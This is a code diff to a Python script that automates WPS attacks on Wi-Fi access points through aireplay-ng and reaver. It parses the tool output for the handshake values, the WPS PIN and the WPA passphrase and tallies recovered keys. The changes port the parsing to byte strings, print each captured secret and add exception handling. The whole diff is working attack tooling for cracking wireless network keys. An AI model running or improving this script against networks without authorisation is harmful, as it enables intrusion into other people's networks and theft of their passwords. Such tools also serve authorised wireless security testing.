@@ -147,13 +147,16 @@ def auto(attackmode):
       subprocess.call(['killall', 'reaver'])
       subprocess.call(['killall', 'aireplay-ng'])
       return 0
+   except:
+      print("Unexpected error:", sys.exc_info()[0])
+      raise
    print('%i Keys have been recovered' % (keycount))
    time.sleep(10)
 
 def reaver():
    global choice, bssid, ssid, keycount, channel, ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
    try:
-      clear()
+      #clear()
       print('Trying to recover %s Key' % (bssid))
       time.sleep(3)
       cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
@@ -168,31 +171,39 @@ def reaver():
          stdout.append(line)
          if time.time() > timeout:
             break
-         if "E-Nonce" in line and ENonce == "":
+         if b"E-Nonce" in line and ENonce == "":
             ENonce=line.split(':',1)[1].strip()
             print("E-Nonce: found")
-         if "PKE" in line and PKE == "":
+            print(ENonce)
+         if b"PKE" in line and PKE == "":
             PKE=line.split(':',1)[1].strip()
             print("PKE: found")
-         if "R-Nonce" in line and RNonce == "":
+            print(PKE)
+         if b"R-Nonce" in line and RNonce == "":
             RNonce=line.split(':',1)[1].strip()
             print("R-Nonce: found")
-         if "PKR" in line and PKR == "":
+            print(RNonce)
+         if b"PKR" in line and PKR == "":
             PKR=line.split(':',1)[1].strip()
             print("PKR: found")
-         if "AuthKey" in line and AuthKey == "":
+            print(PKR)
+         if b"AuthKey" in line and AuthKey == "":
             AuthKey=line.split(':',1)[1].strip()
             print("AuthKey: found")
-         if "E-Hash1" in line and EHash1 == "":
+            print(AuthKey)
+         if b"E-Hash1" in line and EHash1 == "":
             EHash1=line.split(':',1)[1].strip()
             print("E-Hash1: found")
-         if "E-Hash2" in line and EHash2 == "":
+            print(EHash1)
+         if b"E-Hash2" in line and EHash2 == "":
             EHash2=line.split(':',1)[1].strip()
             print("E-Hash2: found")
-         if "WPS pin" in line and PIN == "":
+            print(EHash2)
+         if b"WPS pin" in line and PIN == "":
             PIN=line.split(':',4)[1].strip()
             print("WPS Pin: found")
-         if "WPA PSK" in line:
+            print(PIN)
+         if b"WPA PSK" in line:
             PWD=line.split(':',1)[1].strip()
             print("Key recovered!")
             keycount = keycount + 1
@@ -212,6 +223,9 @@ def reaver():
       subprocess.call(['killall', 'airodump-ng'])
       subprocess.call(['killall', 'reaver'])
       subprocess.call(['killall', 'aireplay-ng'])
+   except:
+      print("Unexpected error:", sys.exc_info()[0])
+      raise
    reset()
 		
 
